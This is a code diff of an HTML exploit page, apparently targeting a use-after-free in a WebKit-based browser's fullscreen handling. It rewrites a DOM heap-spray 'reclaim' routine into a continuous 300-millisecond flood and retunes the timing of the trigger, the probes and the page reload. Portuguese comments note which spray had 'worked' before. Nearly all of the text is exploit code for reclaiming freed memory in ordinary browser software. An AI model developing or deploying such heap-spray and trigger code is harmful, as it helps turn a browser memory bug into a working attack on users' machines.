@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>UAF Aggressive Reclaim (Hybrid Precision)</title>
+<title>UAF Aggressive Reclaim (Critical Window Flood)</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
@@ -42,48 +42,31 @@ function setupFS(){
 }
 
 // ==========================
-// 💣 AGGRESSIVE + PRECISION
+// 💣 RECLAIM (LOOP CONTÍNUO)
 // ==========================
-function reclaim(){
+function reclaimBurst(durationMs){
 
-    log("[*] reclaim");
+    let start = Date.now();
 
-    let bucket=[];
+    function loop(){
 
-    // 🔥 churn
-    for(let i=0;i<8000;i++){
-        let e=document.createElement("div");
-        document.body.appendChild(e);
-        e.remove();
+        if(Date.now() - start > durationMs) return;
+
+        for(let i=0;i<2000;i++){
+
+            let e=document.createElement("div");
+            e.innerHTML="CTRL_"+i+"_4141";
+            document.body.appendChild(e);
+
+            let t=document.createTextNode("TXT_"+i);
+            document.body.appendChild(t);
+        }
+
+        // 🔥 roda novamente IMEDIATO
+        setTimeout(loop, 0);
     }
 
-    // 🔥 HIGH DENSITY SPRAY (igual ao que funcionou)
-    for(let i=0;i<12000;i++){
-        let e=document.createElement("div");
-
-        // ⚠️ curto = mais colisão
-        e.innerHTML = "CTRL_"+i+"_4141";
-
-        document.body.appendChild(e);
-        bucket.push(e);
-    }
-
-    // 🔥 TEXT spray (mistura arenas)
-    for(let i=0;i<12000;i++){
-        let t=document.createTextNode("TXT_"+i+"_BBBB");
-        document.body.appendChild(t);
-        bucket.push(t);
-    }
-
-    // 🔥 ATTR spray
-    for(let i=0;i<8000;i++){
-        let e=document.createElement("div");
-        e.setAttribute("x","CCCC_"+i);
-        document.body.appendChild(e);
-        bucket.push(e);
-    }
-
-    return bucket;
+    loop();
 }
 
 // ==========================
@@ -124,19 +107,18 @@ function trigger(fs){
         document.webkitExitFullscreen?.();
     }catch(e){}
 
-    setTimeout(()=>reclaim(),0);
-    setTimeout(()=>reclaim(),50);
-    setTimeout(()=>reclaim(),100);
+    // 💣 janela crítica REAL
+    reclaimBurst(300); // 🔥 300ms flood
 
-    setTimeout(()=>probe(fs),100);
-    setTimeout(()=>probe(fs),200);
-    setTimeout(()=>probe(fs),300);
+    setTimeout(()=>probe(fs),150);
+    setTimeout(()=>probe(fs),250);
+    setTimeout(()=>probe(fs),350);
 
     setTimeout(()=>{
         alert(logBuffer.join("\n"));
     },400);
 
-    setTimeout(()=>location.reload(),500);
+    setTimeout(()=>location.reload(),600);
 }
 
 // ==========================
